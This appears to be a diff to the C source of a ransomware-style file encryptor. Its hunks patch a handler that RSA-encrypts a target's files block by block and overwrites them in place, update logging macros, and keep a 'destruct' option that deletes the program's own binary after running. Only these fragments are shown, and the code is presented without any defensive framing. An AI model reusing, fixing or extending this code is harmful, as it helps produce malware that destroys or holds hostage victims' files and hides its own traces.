@@ -156,20 +156,20 @@ void encrypt_handler(char *path) {
   /* read from the input file, one block at a time */
   while ((in_len = read(fd, buf, sizeof(buf))) > 0) {
     /* encrypt the read full/partial block */
-    if (!lp_rsa_encrypt(&rsa, buf, in_len, &out_len)) {
+    if (!lp_rsa_encrypt(&rsa, buf, in_len, buf, &out_len)) {
       lp_debug("Failed to encrypt %s (%lu, %lu)", path, in_len, out_len);
-      goto free;
-    }
-
-    /* check the input/output block size */
-    if (out_len > in_len) {
-      lp_debug("Invalid block size for %s: %d > %d", path, out_len, in_len);
       goto free;
     }
 
     /* go back to the start of the block */
     if (lseek(fd, -in_len, SEEK_CUR) < 0) {
       lp_debug("Failed to seek to block for %s: %s", path, lp_str_error());
+      goto free;
+    }
+
+    /* check the input/output block size */
+    if (out_len != in_len && in_len == (int)sizeof(buf)) {
+      lp_debug("Invalid block size for %s: %d != %d", path, out_len, in_len);
       goto free;
     }
 
@@ -262,7 +262,8 @@ int main(int argc, char **argv) {
       quit(EXIT_FAILURE);
   }
 
-  lp_info("Running " FG_BOLD LP_VERSION FG_RESET " with following options:");
+  lp_info("Running " LP_LOG_BOLD LP_VERSION LP_LOG_RESET
+          " with following options:");
   opt_print();
 
   /* load and check the target path and the extensions option */
@@ -390,6 +391,8 @@ int main(int argc, char **argv) {
   /* self destruct */
   if (opt_bool("destruct"))
     unlink(argv[0]);
+
+  /* TODO: probably sync() here if LP_DEBUG is disabled */
 
   lp_success("Operation completed");
   return quit(EXIT_SUCCESS);
